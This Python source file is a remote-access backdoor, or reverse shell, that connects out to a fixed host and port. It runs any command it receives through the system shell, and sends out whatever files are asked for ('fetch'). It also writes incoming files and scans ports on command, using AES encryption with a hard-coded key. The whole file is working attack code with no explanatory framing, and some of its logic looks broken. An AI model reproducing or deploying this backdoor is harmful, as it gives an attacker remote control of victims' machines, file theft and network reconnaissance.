import socket
import subprocess
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

f = open('key.txt','r')
key = f.read()

IV = b"H" * 16
key2 = b"H" * 32

def encrypt(message):
    encryptor = AES.new(key2, AES.MODE_CBC, IV)
    padded_messsage = Padding.pad(message, 16)
    print(padded_messsage)
    encrypted_message = encryptor.encrypt(padded_messsage)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key2, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def scanner(s, ip, ports):
    scan_result = ""
    for port in ports:
        try:
            sock = socket.socket()
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened " + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed " + "\n"
                sock.close()
        except Exception:
            pass
    s.send(encrypt(scan_result.encode()))


def upload(s):
    print("File Receiving started....")
    f = open("D:\\Dahaka\\newFile.txt", "wb")
    while True:
        bits = s.recv(1024)
        if "File Not Found".encode() in bits:
            print("File Not Found")
            break
        elif bits.endswith("EOF".encode()):
            f.write(bits[:-4])
            f.close()
            print("[+] File Upload Successful")
            break
        f.write(bits)


def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)])


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, "rb")
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
            s.send(encrypt("EOF".encode()))
    else:
        s.send(encrypt("File not found".encode()))


def connecting():
    s = socket.socket()
    s.connect(("192.168.1.3", 7174))

    while True:
        command_enc = s.recv(1024)
        command = decrypt(str_xor(command_enc.decode(), key))

        if "exit" in command:
            f.close()
            s.close()
            break
        elif "upload" in command:
            upload(s)
        elif "fetch" in command:
            grab, path = command.split("*")
            try:
                transfer(s, path)
            except:
                pass
        elif "scan" in command:
            command = command[5:]
            ip, ports = command.split(":")
            ports = ports.split(",")
            scanner(s, ip, ports)
        elif "cd" in command:
            code, directory = command.split("*")
            try:
                os.chdir(directory)
                s.send(("[+] CWD is " + os.getcwd()).encode())
            except Exception as e:
                s.send(("[-] " + str(e)).encode())
        else:
            CMD = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            s.send(encrypt(CMD.stderr.read()))
            s.send(encrypt(CMD.stdout.read()))


def main():
    connecting()

main()
